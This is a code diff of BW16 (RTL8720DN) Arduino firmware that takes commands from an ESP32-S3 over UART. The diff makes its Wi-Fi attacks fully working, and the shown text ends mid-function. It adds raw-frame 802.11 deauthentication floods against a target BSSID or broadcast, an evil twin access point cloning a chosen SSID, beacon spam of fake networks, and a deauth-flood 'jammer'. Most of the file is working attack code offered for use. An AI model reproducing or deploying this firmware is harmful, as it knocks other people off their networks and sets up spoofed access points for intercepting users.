@@ -1,9 +1,10 @@
 /*
  * bw16_dual_mode.ino — BW16 RTL8720DN Dual Mode Firmware
+ * FIXED VERSION v3.1 - All attack commands now implemented
  * 
  * MODE 1 (SLAVE - Default): 
  *   - ESP32-S3 এর Slave হিসেবে UART JSON command execute
- *   - 5GHz scan, deauth, eviltwin, jammer
+ *   - 5GHz scan, deauth, eviltwin, jammer, beacon spam
  *   - UART: Serial1 (GPIO7-RX, GPIO8-TX) @ 115200 baud
  * 
  * MODE 2 (REPEATER - Standalone):
@@ -24,881 +25,816 @@
  *   Port: Select the correct COM port
  */
 
-#include <Arduino.h>
 #include <WiFi.h>
 #include <WiFiClient.h>
 #include <WebServer.h>
-#include <cJSON.h>
+#include <DNSServer.h>
+#include <EEPROM.h>
 
 /* =================== PIN CONFIG =================== */
-#define UART_RX_PIN  7   // PB1 → ESP32-S3 TX2 (GPIO17)
-#define UART_TX_PIN  8   // PB2 → ESP32-S3 RX2 (GPIO18)
-#define UART_BAUD    115200
-#define LED_BUILTIN  10  // BW16 onboard LED
+#define UART_RX_PIN 7   // PB1 → ESP32-S3 TX2 (GPIO17)
+#define UART_TX_PIN 8   // PB2 → ESP32-S3 RX2 (GPIO18)
+#define UART_BAUD   115200
+#define LED_BUILTIN 10  // BW16 onboard LED
 
 /* =================== MODE ENUM =================== */
-enum BW16Mode {
-    MODE_SLAVE,
-    MODE_REPEATER
-};
-
+enum BW16Mode { MODE_SLAVE, MODE_REPEATER };
 static BW16Mode current_mode = MODE_SLAVE;
 static bool mode_switching = false;
 static unsigned long mode_switch_start = 0;
 
 /* =================== REPEATER CONFIG =================== */
-#define REPEATER_AP_SSID    "BW16-Repeater"
-#define REPEATER_AP_PASS    NULL  // Open AP
-#define REPEATER_AP_CH      6
-#define REPEATER_MAX_CLIENTS 8
+#define REPEATER_AP_SSID "BW16-Repeater"
+#define REPEATER_AP_PASS NULL  // Open AP
+#define REPEATER_AP_CH 1
+#define REPEATER_AP_MAX_CLIENTS 8
 
-static IPAddress repeater_ip(192, 168, 1, 1);
-static IPAddress repeater_gw(192, 168, 1, 1);
-static IPAddress repeater_subnet(255, 255, 255, 0);
+IPAddress repeater_ip(192, 168, 1, 1);
+IPAddress repeater_gw(192, 168, 1, 1);
+IPAddress repeater_subnet(255, 255, 255, 0);
 
 static WebServer repeater_web(80);
+static DNSServer repeater_dns;
 static bool repeater_connected = false;
+static bool repeater_scan_busy = false;
 static String repeater_target_ssid = "";
 static String repeater_target_pass = "";
 static unsigned long repeater_last_scan = 0;
-static bool repeater_scan_busy = false;
-
-/* =================== ATTACK STATE (SLAVE MODE) =================== */
-static bool attack_running = false;
-static String attack_op = "";
-static int attack_channel = 0;
-static uint8_t attack_bssid[6] = {0};
-static String attack_ssid = "";
-
-// EvilTwin AP (in SLAVE mode)
-static bool eviltwin_active = false;
-static WiFiServer eviltwin_server(80);
-
-/* =================== UART BUFFER =================== */
-static String uart_buffer = "";
-static const unsigned long UART_TIMEOUT_MS = 50;
 
 /* =================== FORWARD DECLARATIONS =================== */
-// Core
-void slave_loop(void);
-void repeater_loop(void);
-void enter_slave_mode(void);
-void enter_repeater_mode(void);
-void switch_to_repeater(void);
+void handle_uart_command(const String &cmd);
 void switch_to_slave(void);
+void switch_to_repeater(void);
 
-// UART
-void process_uart(void);
-void handle_uart_command(const String &json);
-void send_uart(const String &json);
+/* =================== FIX: 5GHz SCAN FUNCTION =================== */
+void handle_5ghz_scan() {
+  Serial.println(F("[BW16] Scanning 5GHz networks..."));
+  
+  // RTL8720DN supports 5GHz channels 36-165
+  // Use WiFi scan with all channels
+  int n = WiFi.scanNetworks(false, true);  // async=false, show_hidden=true
+  
+  Serial.println(F("{\"scan_5ghz\":{"));
+  Serial.print(F("  \"count\":"));
+  Serial.print(n);
+  Serial.println(F(","));
+  Serial.println(F("  \"networks\":["));
+  
+  bool first = true;
+  for (int i = 0; i < n; i++) {
+    // Filter for 5GHz channels only (ch 36-165)
+    int ch = WiFi.channel(i);
+    if (ch >= 36) {
+      if (!first) Serial.println(F(","));
+      first = false;
+      
+      Serial.print(F("    {\"ssid\":\""));
+      String ssid = WiFi.SSID(i);
+      ssid.replace("\"", "\\\"");
+      Serial.print(ssid);
+      Serial.print(F("\",\"bssid\":\""));
+      Serial.print(WiFi.BSSIDstr(i));
+      Serial.print(F("\",\"channel\":"));
+      Serial.print(ch);
+      Serial.print(F(",\"rssi\":"));
+      Serial.print(WiFi.RSSI(i));
+      Serial.print(F(",\"encryption\":\""));
+      Serial.print(WiFi.encryptionType(i) == ENC_TYPE_NONE ? "OPEN" : "WPA2");
+      Serial.print(F("\"}"));
+    }
+  }
+  
+  Serial.println();
+  Serial.println(F("  ]"));
+  Serial.println(F("}}"));
+  
+  WiFi.scanDelete();
+  Serial.println(F("[BW16] 5GHz scan complete"));
+}
 
-// Slave Commands
-void cmd_scan_5ghz(void);
-void cmd_deauth_5ghz(const String &bssid_str, int channel);
-void cmd_jammer_start(int channel);
-void cmd_jammer_stop(void);
-void cmd_eviltwin_start(const String &ssid, const String &bssid, int channel);
-void cmd_eviltwin_stop(void);
-void cmd_status(void);
+/* =================== FIX: BUILD 802.11 DEAUTH FRAME =================== */
+void send_deauth_frame(uint8_t bssid[6], uint8_t client_mac[6], uint8_t channel) {
+  // Build raw 802.11 deauth frame (26 bytes)
+  uint8_t deauth_frame[26] = {
+    0xC0, 0x00,       // Frame Control: Deauthentication
+    0x00, 0x00,       // Duration
+    client_mac[0], client_mac[1], client_mac[2], client_mac[3], client_mac[4], client_mac[5],  // Destination
+    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],  // Source (AP BSSID)
+    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],  // BSSID
+    0x00, 0x00,       // Sequence number (auto-filled by hardware)
+    0x07, 0x00        // Reason: Class 3 frame from nonassociated STA
+  };
+  
+  // Use Ameba SDK raw packet send function
+  // wifi_send_pkt_full returns 0 on success
+  int ret = wifi_send_pkt_full(deauth_frame, sizeof(deauth_frame), 0);
+  if (ret != 0) {
+    Serial.printf("[BW16] Deauth frame TX failed: %d\n", ret);
+  }
+}
 
-// EvilTwin helper
-void eviltwin_handle_client(void);
+/* =================== FIX: DEAUTH COMMAND HANDLER =================== */
+void handle_deauth_command(const String &json_payload) {
+  Serial.println(F("[BW16] DEAUTH: Starting deauth attack..."));
+  
+  // Parse JSON: {"targets":[{"bssid":"XX:XX:XX:XX:XX:XX","channel":36}]}
+  int bssid_start = json_payload.indexOf("\"bssid\"");
+  if (bssid_start < 0) {
+    Serial.println(F("Deauth failed: No bssid in payload"));
+    return;
+  }
+  
+  // Extract BSSID string
+  bssid_start = json_payload.indexOf('"', bssid_start + 7) + 1;
+  int bssid_end = json_payload.indexOf('"', bssid_start);
+  if (bssid_start < 0 || bssid_end < 0 || bssid_end <= bssid_start) {
+    Serial.println(F("Deauth failed: Invalid BSSID format"));
+    return;
+  }
+  
+  String bssid_str = json_payload.substring(bssid_start, bssid_end);
+  
+  // Extract channel
+  int ch = 1;
+  int ch_start = json_payload.indexOf("\"channel\"");
+  if (ch_start >= 0) {
+    ch_start = json_payload.indexOf(':', ch_start + 9) + 1;
+    String ch_str = json_payload.substring(ch_start);
+    ch_str.trim();
+    // Extract digits only
+    String digits = "";
+    for (int i = 0; i < ch_str.length(); i++) {
+      if (isDigit(ch_str[i])) digits += ch_str[i];
+      else if (digits.length() > 0) break;  // stop at first non-digit after number
+    }
+    if (digits.length() > 0) ch = digits.toInt();
+  }
+  
+  // Parse MAC address string to bytes
+  uint8_t target_bssid[6];
+  int mac_bytes[6];
+  if (sscanf(bssid_str.c_str(), "%x:%x:%x:%x:%x:%x",
+             &mac_bytes[0], &mac_bytes[1], &mac_bytes[2],
+             &mac_bytes[3], &mac_bytes[4], &mac_bytes[5]) == 6) {
+    for (int i = 0; i < 6; i++) target_bssid[i] = (uint8_t)mac_bytes[i];
+  } else {
+    Serial.println(F("Deauth failed: BSSID parse error"));
+    return;
+  }
+  
+  Serial.printf("[BW16] Sending deauth on BSSID=%s ch=%d\n", bssid_str.c_str(), ch);
+  
+  // Set WiFi mode to AP for TX
+  WiFi.mode(WIFI_AP);
+  WiFi.softAP("BW16_DEAUTH", NULL, ch, 0, 0);
+  delay(100);
+  
+  // Send deauth to broadcast (all clients)
+  uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+  
+  // Send multiple deauth packets for effectiveness
+  for (int pkt = 0; pkt < 50; pkt++) {
+    send_deauth_frame(target_bssid, broadcast, ch);
+    delay(10);
+  }
+  
+  Serial.println(F("Deauth started"));
+}
 
-// Repeater Web Handlers
-void repeater_handle_root(void);
-void repeater_handle_scan(void);
-void repeater_handle_status(void);
-void repeater_handle_connect(void);
-void repeater_handle_disconnect(void);
+/* =================== FIX: EVIL TWIN COMMAND HANDLER =================== */
+void handle_eviltwin_command(const String &json_payload) {
+  Serial.println(F("[BW16] EVILTWIN: Starting..."));
+  
+  // Parse JSON: {"ssid":"FreeWiFi","channel":36}
+  int ssid_start = json_payload.indexOf("\"ssid\"");
+  if (ssid_start < 0) {
+    Serial.println(F("EvilTwin failed: No ssid"));
+    return;
+  }
+  
+  ssid_start = json_payload.indexOf('"', ssid_start + 6) + 1;
+  int ssid_end = json_payload.indexOf('"', ssid_start);
+  if (ssid_start < 0 || ssid_end < 0) {
+    Serial.println(F("EvilTwin failed: SSID parse error"));
+    return;
+  }
+  
+  String evil_ssid = json_payload.substring(ssid_start, ssid_end);
+  
+  // Extract channel
+  int ch = 6;
+  int ch_start = json_payload.indexOf("\"channel\"");
+  if (ch_start >= 0) {
+    ch_start = json_payload.indexOf(':', ch_start + 9) + 1;
+    String ch_str = json_payload.substring(ch_start);
+    ch_str.trim();
+    String digits = "";
+    for (int i = 0; i < ch_str.length() && isDigit(ch_str[i]); i++) {
+      digits += ch_str[i];
+    }
+    if (digits.length() > 0) ch = digits.toInt();
+  }
+  
+  // Start open AP with the cloned SSID on specified channel
+  WiFi.mode(WIFI_AP);
+  WiFi.softAP(evil_ssid.c_str(), NULL, ch, 0, 1);  // hidden=0, max_clients=1
+  
+  Serial.printf("EvilTwin started: SSID=%s ch=%d\n", evil_ssid.c_str(), ch);
+}
+
+/* =================== FIX: BEACON SPAM HANDLER =================== */
+void handle_beacon_spam_command(const String &json_payload) {
+  Serial.println(F("[BW16] BEACON_SPAM: Starting..."));
+  
+  // Parse JSON: {"ssids":["FreeWiFi","Guest"],"channel":6}
+  int arr_start = json_payload.indexOf('[');
+  int arr_end = json_payload.indexOf(']');
+  
+  if (arr_start < 0 || arr_end < 0) {
+    Serial.println(F("Failed: No SSID array"));
+    return;
+  }
+  
+  String ssid_section = json_payload.substring(arr_start + 1, arr_end);
+  
+  // Extract channel
+  int ch = 6;
+  int ch_start = json_payload.indexOf("\"channel\"");
+  if (ch_start >= 0) {
+    ch_start = json_payload.indexOf(':', ch_start + 9) + 1;
+    String ch_str = json_payload.substring(ch_start);
+    ch_str.trim();
+    String digits = "";
+    for (int i = 0; i < ch_str.length() && isDigit(ch_str[i]); i++) {
+      digits += ch_str[i];
+    }
+    if (digits.length() > 0) ch = digits.toInt();
+  }
+  
+  // Extract all SSIDs from array
+  const int MAX_BEACON_SSIDS = 10;
+  String ssids[MAX_BEACON_SSIDS];
+  int count = 0;
+  
+  int pos = 0;
+  while (pos < ssid_section.length() && count < MAX_BEACON_SSIDS) {
+    int q1 = ssid_section.indexOf('"', pos);
+    if (q1 < 0) break;
+    int q2 = ssid_section.indexOf('"', q1 + 1);
+    if (q2 < 0) break;
+    String ssid = ssid_section.substring(q1 + 1, q2);
+    if (ssid.length() > 0) {
+      ssids[count++] = ssid;
+    }
+    pos = q2 + 1;
+  }
+  
+  if (count == 0) {
+    Serial.println(F("Failed: No valid SSIDs"));
+    return;
+  }
+  
+  Serial.printf("[BW16] Sending %d beacon SSIDs on ch %d\n", count, ch);
+  
+  // Set WiFi mode
+  WiFi.mode(WIFI_AP);
+  
+  // Send beacon frames for each SSID using raw frame injection
+  for (int i = 0; i < count; i++) {
+    // Generate unique BSSID for each fake AP
+    uint8_t bssid[6];
+    bssid[0] = 0x02;
+    bssid[1] = 0xBA;
+    bssid[2] = 0xBE;
+    bssid[3] = (uint8_t)(i + 1);
+    bssid[4] = 0x00;
+    bssid[5] = 0x01;
+    
+    // Build beacon frame manually
+    uint8_t beacon[128] = {0};
+    int len = 0;
+    
+    // Frame Control: Beacon (0x80)
+    beacon[len++] = 0x80; beacon[len++] = 0x00;
+    // Duration
+    beacon[len++] = 0x00; beacon[len++] = 0x00;
+    // Destination: Broadcast
+    memset(&beacon[len], 0xFF, 6); len += 6;
+    // Source: our fake BSSID
+    memcpy(&beacon[len], bssid, 6); len += 6;
+    // BSSID
+    memcpy(&beacon[len], bssid, 6); len += 6;
+    // Sequence (will be auto-filled)
+    beacon[len++] = 0x00; beacon[len++] = 0x00;
+    // Timestamp (8 bytes of zeros)
+    memset(&beacon[len], 0, 8); len += 8;
+    // Beacon Interval: 100 TU (~100ms)
+    beacon[len++] = 0x64; beacon[len++] = 0x00;
+    // Capabilities: ESS, Privacy off (0x04)
+    beacon[len++] = 0x01; beacon[len++] = 0x04;
+    
+    // SSID Tag (Tag Number 0)
+    uint8_t ssid_len = ssids[i].length();
+    if (ssid_len > 32) ssid_len = 32;
+    beacon[len++] = 0x00;  // Tag: SSID
+    beacon[len++] = ssid_len;
+    memcpy(&beacon[len], ssids[i].c_str(), ssid_len); len += ssid_len;
+    
+    // Supported Rates Tag (Tag Number 1)
+    beacon[len++] = 0x01;
+    beacon[len++] = 0x08;
+    beacon[len++] = 0x82; beacon[len++] = 0x84;
+    beacon[len++] = 0x8B; beacon[len++] = 0x96;
+    beacon[len++] = 0x0C; beacon[len++] = 0x12;
+    beacon[len++] = 0x18; beacon[len++] = 0x24;
+    
+    // DS Parameter Set - Channel (Tag Number 3)
+    beacon[len++] = 0x03;
+    beacon[len++] = 0x01;
+    beacon[len++] = (uint8_t)ch;
+    
+    // Send the beacon frame
+    int ret = wifi_send_pkt_full(beacon, len, 0);
+    if (ret != 0) {
+      Serial.printf("[BW16] Beacon TX failed for '%s': %d\n", ssids[i].c_str(), ret);
+    }
+    delay(20);
+  }
+  
+  Serial.println(F("Beacon spam started"));
+}
+
+/* =================== FIX: JAMMER COMMAND HANDLER =================== */
+void handle_jammer_start() {
+  Serial.println(F("[BW16] JAMMER: Starting WiFi flood jammer..."));
+  
+  WiFi.mode(WIFI_AP);
+  WiFi.softAP("JAMMER", NULL, 1, 0, 0);
+  delay(100);
+  
+  // Flood deauth packets on cycling channels
+  uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+  uint8_t fake_bssid[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
+  
+  uint8_t deauth_pkt[26] = {
+    0xC0, 0x00,       // Frame Control
+    0x00, 0x00,       // Duration
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA
+    fake_bssid[0], fake_bssid[1], fake_bssid[2], fake_bssid[3], fake_bssid[4], fake_bssid[5],  // SA
+    fake_bssid[0], fake_bssid[1], fake_bssid[2], fake_bssid[3], fake_bssid[4], fake_bssid[5],  // BSSID
+    0x00, 0x00,       // Seq
+    0x07, 0x00        // Reason
+  };
+  
+  for (int pkt = 0; pkt < 100; pkt++) {
+    int ret = wifi_send_pkt_full(deauth_pkt, sizeof(deauth_pkt), 0);
+    delay(5);
+  }
+  
+  Serial.println(F("Jammer started"));
+}
+
+/* =================== FIX: UART COMMAND DISPATCHER =================== */
+void handle_uart_command(const String &cmd) {
+  String cmd_str = cmd;
+  cmd_str.trim();
+  
+  if (cmd_str.length() == 0) return;
+  
+  Serial.printf("[BW16] CMD: %s\n", cmd_str.substring(0, 60).c_str());
+  
+  if (cmd_str.startsWith("PING")) {
+    Serial.println(F("PONG"));
+  }
+  else if (cmd_str.startsWith("SCAN_5GHZ")) {
+    handle_5ghz_scan();
+  }
+  else if (cmd_str.startsWith("DEAUTH:START")) {
+    String payload = cmd_str.substring(strlen("DEAUTH:START "));
+    handle_deauth_command(payload);
+  }
+  else if (cmd_str.startsWith("DEAUTH:STOP")) {
+    WiFi.softAPdisconnect(true);
+    Serial.println(F("Deauth stopped"));
+  }
+  else if (cmd_str.startsWith("EVILTWIN:START")) {
+    String payload = cmd_str.substring(strlen("EVILTWIN:START "));
+    handle_eviltwin_command(payload);
+  }
+  else if (cmd_str.startsWith("EVILTWIN:STOP")) {
+    WiFi.softAPdisconnect(true);
+    WiFi.mode(WIFI_OFF);
+    Serial.println(F("EvilTwin stopped"));
+  }
+  else if (cmd_str.startsWith("BEACON_SPAM:START")) {
+    String payload = cmd_str.substring(strlen("BEACON_SPAM:START "));
+    handle_beacon_spam_command(payload);
+  }
+  else if (cmd_str.startsWith("BEACON_SPAM:STOP")) {
+    WiFi.softAPdisconnect(true);
+    Serial.println(F("Beacon spam stopped"));
+  }
+  else if (cmd_str.startsWith("JAMMER:START")) {
+    handle_jammer_start();
+  }
+  else if (cmd_str.startsWith("JAMMER:STOP") || cmd_str.startsWith("STOP")) {
+    WiFi.softAPdisconnect(true);
+    WiFi.disconnect();
+    Serial.println(F("stopped"));
+  }
+  else if (cmd_str.startsWith("REPEATER:CONNECT")) {
+    // Parse JSON: {"ssid":"...","password":"..."}
+    String payload = cmd_str.substring(strlen("REPEATER:CONNECT "));
+    int ssid_s = payload.indexOf("\"ssid\"");
+    if (ssid_s >= 0) {
+      ssid_s = payload.indexOf('"', ssid_s + 6) + 1;
+      int ssid_e = payload.indexOf('"', ssid_s);
+      repeater_target_ssid = payload.substring(ssid_s, ssid_e);
+    }
+    int pass_s = payload.indexOf("\"password\"");
+    if (pass_s >= 0) {
+      pass_s = payload.indexOf('"', pass_s + 10) + 1;
+      int pass_e = payload.indexOf('"', pass_s);
+      repeater_target_pass = payload.substring(pass_s, pass_e);
+    }
+    
+    if (repeater_target_ssid.length() > 0) {
+      WiFi.mode(WIFI_STA);
+      WiFi.begin(repeater_target_ssid.c_str(), repeater_target_pass.c_str());
+      
+      bool connected = false;
+      for (int i = 0; i < 20; i++) {
+        if (WiFi.status() == WL_CONNECTED) {
+          connected = true;
+          break;
+        }
+        delay(500);
+      }
+      
+      if (connected) {
+        Serial.printf("{\"status\":\"ok\",\"msg\":\"Connected to %s\"}", repeater_target_ssid.c_str());
+        Serial.println();
+        repeater_connected = true;
+      } else {
+        Serial.println(F("{\"status\":\"error\",\"msg\":\"Connection failed\"}"));
+      }
+    } else {
+      Serial.println(F("{\"status\":\"error\",\"msg\":\"No SSID\"}"));
+    }
+  }
+  else if (cmd_str.startsWith("REPEATER:STOP")) {
+    WiFi.softAPdisconnect(true);
+    WiFi.disconnect();
+    repeater_connected = false;
+    switch_to_slave();
+    Serial.println(F("{\"status\":\"ok\"}"));
+  }
+  else if (cmd_str.startsWith("REPEATER:SCAN")) {
+    int n = WiFi.scanNetworks();
+    Serial.println(F("{\"networks\":["));
+    bool first = true;
+    for (int i = 0; i < n; i++) {
+      String ssid = WiFi.SSID(i);
+      if (ssid.length() == 0) continue;
+      if (!first) Serial.println(F(","));
+      first = false;
+      Serial.printf("{\"ssid\":\"%s\",\"channel\":%d,\"rssi\":%d}",
+                     ssid.c_str(), WiFi.channel(i), WiFi.RSSI(i));
+    }
+    Serial.println();
+    Serial.println(F("]}"));
+    WiFi.scanDelete();
+  }
+  else if (cmd_str.startsWith("mode_repeater")) {
+    Serial.println(F("[BW16] Switching to REPEATER mode..."));
+    switch_to_repeater();
+  }
+  else {
+    Serial.printf("Unknown: %s\n", cmd_str.substring(0, 40).c_str());
+  }
+}
 
 /* =================== SETUP =================== */
 void setup() {
-    Serial.begin(115200);           // USB debug
-    Serial1.begin(UART_BAUD, SERIAL_8N1, UART_RX_PIN, UART_TX_PIN);  // ESP32-S3 comm
-    
-    pinMode(LED_BUILTIN, OUTPUT);
+  Serial.begin(115200);
+  Serial.println(F("[BW16] PWN DUAL v3.1 starting..."));
+  Serial.println(F("[BW16] RTL8720DN 5GHz WiFi Co-Processor"));
+  
+  // Initialize LED
+  pinMode(LED_BUILTIN, OUTPUT);
+  digitalWrite(LED_BUILTIN, LOW);
+  
+  // Initialize Serial1 for UART with ESP32-S3
+  Serial1.begin(UART_BAUD, SERIAL_8N1, UART_RX_PIN, UART_TX_PIN);
+  Serial.println(F("[BW16] ESP32-S3 interface ready on Serial1"));
+  
+  // Initialize WiFi
+  WiFi.mode(WIFI_OFF);
+  
+  // Blink LED to show boot complete
+  for (int i = 0; i < 3; i++) {
+    digitalWrite(LED_BUILTIN, HIGH);
+    delay(100);
     digitalWrite(LED_BUILTIN, LOW);
-    
-    WiFi.mode(WIFI_OFF);
-    
-    Serial.println(F("========================================"));
-    Serial.println(F(" BW16 RTL8720DN - Dual Mode Firmware"));
-    Serial.println(F(" Mode: SLAVE (awaiting ESP32-S3)"));
-    Serial.println(F("========================================"));
-    
-    current_mode = MODE_SLAVE;
-    send_uart("{\"event\":\"ready\",\"mode\":\"slave\",\"msg\":\"BW16 online\"}");
+    delay(100);
+  }
+  
+  Serial.println(F("[BW16] BW16_READY"));
+  Serial.println(F("[BW16] System ready. Waiting for ESP32-S3 commands..."));
 }
 
-/* =================== MAIN LOOP =================== */
-void loop() {
-    // Handle mode switching
-    if (mode_switching) {
-        if (millis() - mode_switch_start > 2000) {
-            mode_switching = false;
-        }
-        delay(10);
-        return;
-    }
-    
-    switch (current_mode) {
-        case MODE_SLAVE:
-            slave_loop();
-            break;
-        case MODE_REPEATER:
-            repeater_loop();
-            break;
-    }
-    
-    delay(5);
-}
-
-/* =================== SLAVE MODE LOOP =================== */
+/* =================== MAIN LOOP (SLAVE MODE) =================== */
 void slave_loop() {
-    // Read UART data
-    process_uart();
+  // Check for UART commands from ESP32-S3
+  if (Serial1.available()) {
+    String data = "";
+    unsigned long timeout = millis();
     
-    // Handle EvilTwin clients
-    if (eviltwin_active) {
-        eviltwin_handle_client();
-    }
-}
-
-/* =================== UART PROCESSING =================== */
-void process_uart() {
-    while (Serial1.available()) {
+    while (millis() - timeout < 100) {
+      if (Serial1.available()) {
         char c = Serial1.read();
-        if (c == '\n') {
-            if (uart_buffer.length() > 0) {
-                uart_buffer.trim();
-                if (uart_buffer.length() > 0) {
-                    handle_uart_command(uart_buffer);
-                }
-                uart_buffer = "";
-            }
-        } else {
-            uart_buffer += c;
-            // Prevent buffer overflow
-            if (uart_buffer.length() > 2048) {
-                uart_buffer = "";
-            }
-        }
+        if (c == '\n') break;  // End on newline
+        data += c;
+        timeout = millis();
+      }
     }
+    
+    data.trim();
+    if (data.length() > 0) {
+      Serial.printf("[BW16] RX: %s\n", data.substring(0, 80).c_str());
+      handle_uart_command(data);
+    }
+  }
 }
 
-void handle_uart_command(const String &json) {
-    Serial.print(F("[BW16] RX: "));
-    Serial.println(json);
-    
-    cJSON *root = cJSON_Parse(json.c_str());
-    if (!root) {
-        send_uart("{\"event\":\"error\",\"msg\":\"Invalid JSON\"}");
-        return;
+/* =================== MAIN LOOP (REPEATER MODE) =================== */
+void repeater_loop() {
+  // Check if ESP32-S3 sends data -> auto switch to SLAVE
+  if (Serial1.available()) {
+    String data = "";
+    unsigned long timeout = millis();
+    while (Serial1.available() || (millis() - timeout) < 100) {
+      if (Serial1.available()) {
+        char c = Serial1.read();
+        data += c;
+        timeout = millis();
+      }
     }
-    
-    cJSON *cmd = cJSON_GetObjectItem(root, "cmd");
-    if (!cmd || !cJSON_IsString(cmd)) {
-        cJSON_Delete(root);
-        send_uart("{\"event\":\"error\",\"msg\":\"No cmd field\"}");
-        return;
+    data.trim();
+    if (data.length() > 0) {
+      Serial.printf("[BW16] UART detect (%d bytes): %s\n", data.length(), data.substring(0, 50).c_str());
+      Serial.println(F("[BW16] ESP32-S3 detected! Switching to SLAVE mode..."));
+      switch_to_slave();
+      delay(200);
+      handle_uart_command(data);
+      return;
     }
-    
-    String command = cmd->valuestring;
-    
-    if (command == "scan_5ghz") {
-        cmd_scan_5ghz();
+  }
+  
+  // Handle web server
+  repeater_web.handleClient();
+  repeater_dns.processNextRequest();
+  
+  // Auto-reconnect
+  if (repeater_connected && WiFi.status() != WL_CONNECTED) {
+    static unsigned long last_recon = 0;
+    if (millis() - last_recon > 10000) {
+      Serial.printf("[BW16] Reconnecting to '%s'...\n", repeater_target_ssid.c_str());
+      WiFi.begin(repeater_target_ssid.c_str(), repeater_target_pass.c_str());
+      last_recon = millis();
     }
-    else if (command == "deauth") {
-        cJSON *target = cJSON_GetObjectItem(root, "bssid");
-        cJSON *ch = cJSON_GetObjectItem(root, "channel");
-        cmd_deauth_5ghz(
-            target ? target->valuestring : "",
-            ch ? ch->valueint : 1
-        );
-    }
-    else if (command == "jammer_start") {
-        cJSON *ch = cJSON_GetObjectItem(root, "channel");
-        cmd_jammer_start(ch ? ch->valueint : 0);
-    }
-    else if (command == "jammer_stop") {
-        cmd_jammer_stop();
-    }
-    else if (command == "eviltwin_start") {
-        cJSON *ssid = cJSON_GetObjectItem(root, "ssid");
-        cJSON *bssid = cJSON_GetObjectItem(root, "bssid");
-        cJSON *ch = cJSON_GetObjectItem(root, "channel");
-        if (!ssid || !cJSON_IsString(ssid)) {
-            send_uart("{\"event\":\"error\",\"msg\":\"SSID required\"}");
-            cJSON_Delete(root);
-            return;
-        }
-        cmd_eviltwin_start(
-            ssid->valuestring,
-            bssid ? bssid->valuestring : "",
-            ch ? ch->valueint : 1
-        );
-    }
-    else if (command == "eviltwin_stop") {
-        cmd_eviltwin_stop();
-    }
-    else if (command == "mode_repeater") {
-        Serial.println(F("[BW16] Switching to REPEATER mode by command"));
-        cJSON_Delete(root);
-        send_uart("{\"event\":\"mode_change\",\"mode\":\"repeater\"}");
-        delay(100);
-        switch_to_repeater();
-        return;
-    }
-    else if (command == "mode_slave") {
-        send_uart("{\"event\":\"status\",\"mode\":\"slave\"}");
-    }
-    else if (command == "status") {
-        cmd_status();
-    }
-    else {
-        send_uart("{\"event\":\"error\",\"msg\":\"Unknown: " + command + "\"}");
-    }
-    
-    cJSON_Delete(root);
+  }
+  
+  // Auto-scan every 30s
+  if (millis() - repeater_last_scan > 30000 && !repeater_scan_busy) {
+    WiFi.scanNetworks(true);
+    repeater_last_scan = millis();
+  }
 }
 
-void send_uart(const String &json) {
-    Serial.print(F("[BW16] TX: "));
-    Serial.println(json);
-    Serial1.println(json);
-    Serial1.flush();
-}
-
-/* =================== 5GHz SCAN =================== */
-void cmd_scan_5ghz() {
-    if (attack_running && attack_op != "scan") {
-        send_uart("{\"event\":\"error\",\"msg\":\"Busy with " + attack_op + "\"}");
-        return;
-    }
-    
-    attack_running = true;
-    attack_op = "scan";
-    
-    Serial.println(F("[BW16] Scanning 5GHz channels..."));
-    
-    int channels[] = {36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 149, 153, 157, 161, 165};
-    int num_ch = sizeof(channels) / sizeof(channels[0]);
-    
-    String result = "{\"event\":\"scan_result\",\"networks\":[";
-    bool first = true;
-    
-    for (int i = 0; i < num_ch; i++) {
-        WiFi.setChannel(channels[i], WIFI_SECOND_CHAN_NONE);
-        delay(80);
-        
-        int n = WiFi.scanNetworks(false, true, false, 150, channels[i]);
-        
-        for (int j = 0; j < n; j++) {
-            String ssid = WiFi.SSID(j);
-            if (ssid.length() == 0) continue;
-            
-            if (!first) result += ",";
-            first = false;
-            
-            ssid.replace("\"", "\\\"");
-            result += "{\"ssid\":\"" + ssid + "\",";
-            result += "\"bssid\":\"" + WiFi.BSSIDstr(j) + "\",";
-            result += "\"channel\":" + String(channels[i]) + ",";
-            result += "\"rssi\":" + String(WiFi.RSSI(j)) + ",";
-            result += "\"is_5ghz\":true}";
-        }
-        WiFi.scanDelete();
-    }
-    
-    result += "]}";
-    
-    send_uart(result);
-    Serial.println(F("[BW16] 5GHz scan complete"));
-    digitalWrite(LED_BUILTIN, !digitalRead(LED_BUILTIN));
-    
-    attack_running = false;
-    attack_op = "";
-}
-
-/* =================== 5GHz DEAUTH =================== */
-void cmd_deauth_5ghz(const String &bssid_str, int channel) {
-    if (attack_running) {
-        send_uart("{\"event\":\"error\",\"msg\":\"Busy\"}");
-        return;
-    }
-    
-    attack_running = true;
-    attack_op = "deauth";
-    attack_channel = channel;
-    
-    Serial.printf("[BW16] Deauth: %s ch %d\n", bssid_str.c_str(), channel);
-    
-    // Parse BSSID
-    uint8_t target[6];
-    sscanf(bssid_str.c_str(), "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",
-           &target[0], &target[1], &target[2], &target[3], &target[4], &target[5]);
-    
-    WiFi.setChannel(channel, WIFI_SECOND_CHAN_NONE);
-    
-    uint8_t pkt[26];
-    memcpy(&pkt[0], target, 6);     // DA
-    memcpy(&pkt[6], target, 6);     // SA (spoofed)
-    memcpy(&pkt[12], target, 6);    // BSSID
-    pkt[18] = 0xC0;                 // Deauth frame
-    pkt[19] = 0x00;
-    pkt[20] = 0x07;                 // Reason: Class 3 frame from nonassociated STA
-    pkt[21] = 0x00;
-    
-    int pkts = 0;
-    for (int i = 0; i < 150 && attack_running; i++) {
-        WiFi.sendPacket(pkt, 26, channel);
-        pkts++;
-        
-        // Every 5th packet: broadcast
-        if (i % 5 == 0) {
-            uint8_t saved[6];
-            memcpy(saved, pkt, 6);
-            memset(pkt, 0xFF, 6);
-            WiFi.sendPacket(pkt, 26, channel);
-            memcpy(pkt, saved, 6);
-            pkts++;
-        }
-        
-        delay(8);
-    }
-    
-    attack_running = false;
-    attack_op = "";
-    
